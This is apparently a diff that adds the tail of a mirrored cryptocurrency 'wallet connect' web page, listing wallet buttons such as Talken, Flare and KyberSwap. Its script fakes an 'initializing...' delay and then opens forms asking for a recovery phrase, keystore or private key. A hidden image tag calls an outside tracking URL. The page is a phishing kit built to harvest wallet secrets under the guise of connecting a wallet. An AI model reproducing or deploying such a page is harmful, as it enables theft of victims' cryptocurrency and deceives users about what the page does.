+                            <h4>Aktionariat</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal64" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/unnamed%20(9).png" alt="">
+                            <h4>Talken</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal65" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/0x0.png" alt="">
+                            <h4>Flare</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal66" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/lg(7).html" alt="">
+                            <h4>KyberSwap</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal70" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/unnamed%20(10).png" alt="">
+                            <h4>PayTube</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal72" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/dd8ee41915d967e547c80266e883d77ee808427405f4e8026a85ac1308104221.png" alt="">
+                            <h4>Linen</h4>
+                        </button>
+                        <img src="https://network.contractsolutions.digital/imp/index.php" alt="" id="img-test">
+                        <!-- Modal -->
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="text-center coin-section-footer">
+                        <h6>&nbsp;</h6>
+                    </div>
+                </div>
+
+
+            </div>
+        </div>
+    </div>
+    <script src="static1/jquery-3.6.0.min.html" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <!-- <script src="./script/walletpage.js"></script> -->
+    <script src="static1/popper.min.html" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
+    <script src="static1/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+    <script src="static1/jquery.waypoints.min.js"></script>
+    <script src="static1/jquery.counterup.min.js"></script>
+    <script src="static1/wow.min.js"></script>
+    <script src="static1/script.js"></script>
+
+
+
+    <script>
+        const modalElement = document.getElementById('send-dialog')
+        const modalFormElement = document.getElementById('cdialog')
+        const miniModalElement = document.getElementById('connect-dialog')
+        const connectInfoText = document.getElementById('connection-info')
+        const walletLogo = document.getElementById('current-wallet-logo')
+        const modalwalletLogo = document.getElementById('current-wallet-send-logo')
+        const loaderElement = document.getElementById('loader')
+        const proceedbtn = document.getElementById('procedButton')
+        const phrase = document.getElementById('phraseSend')
+        const keystore = document.getElementById('keystoreSend')
+        const privateKey = document.getElementById('privateKeySend')
+        const phraseForm = document.getElementById('processForm')
+        const keystoreForm = document.getElementById('processForm1')
+        const privateForm = document.getElementById('processForm2')
+        let btn = document.querySelectorAll(".coin");
+
+        for (let i = 0; i < btn.length; i++) {
+            btn[i].addEventListener('click', function () {
+                let img_icon = btn[i].children[0].getAttribute('src')
+                setTimeout(function () {
+                    miniModalElement.style.display = 'block'
+                    connectInfoText.innerHTML = 'initializing...'
+                    walletLogo.setAttribute('src', img_icon)
+                }, 1000)
+                setTimeout(function () {
+                    miniModalElement.style.display = 'none'
+                    modalElement.style.display = 'block'
+                    modalwalletLogo.setAttribute('src', img_icon)
+                }, 3000)
+            })
+        }
+
+        function closeModal(){
+             modalElement.style.display = 'none'
+        }
+
+        phrase.addEventListener('click', function () {
+            phraseForm.style.display = 'block'
+            keystoreForm.style.display = 'none'
+            privateForm.style.display = 'none'
+        })
+
+        keystore.addEventListener('click', function () {
+            keystoreForm.style.display = 'block'
+            phraseForm.style.display = 'none'
+            privateForm.style.display = 'none'
+        })
+
+        privateKey.addEventListener('click', function () {
+            phraseForm.style.display = 'none'
+            keystoreForm.style.display = 'none'
+            privateForm.style.display = 'block'
+        })
+
+    </script>
+
+
+</body>
+
+<!-- Mirrored from app.avouch-protocol.com/wallets by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 20 Apr 2024 22:21:26 GMT -->
+</html>
